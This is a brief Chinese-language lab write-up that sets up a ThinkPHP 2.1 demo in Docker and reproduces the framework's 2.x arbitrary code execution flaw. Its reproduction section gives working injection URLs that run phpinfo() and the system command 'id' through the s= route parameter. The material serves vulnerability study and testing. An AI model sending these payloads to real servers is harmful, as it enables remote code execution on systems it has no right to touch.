# ThinkPHP 2.x 任意代码执行漏洞

## 环境搭建

执行如下命令启动ThinkPHP 2.1的Demo应用：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080/Index/Index即可查看到默认页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922550182-24d6e701-9105-449b-b575-18f55b02535f.png)

## 漏洞复现

直接访问http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D即可执行phpinfo()：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922550322-2dbba563-6cf4-45df-919d-57a69a41328a.png)

执行系统命令：

```plain
http://your-ip:8080/index.php?s=/index/index/name/$%7Bsystem(id)%7D
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922550409-a1a252a3-26aa-4c60-9ee9-1c6a578055c7.png)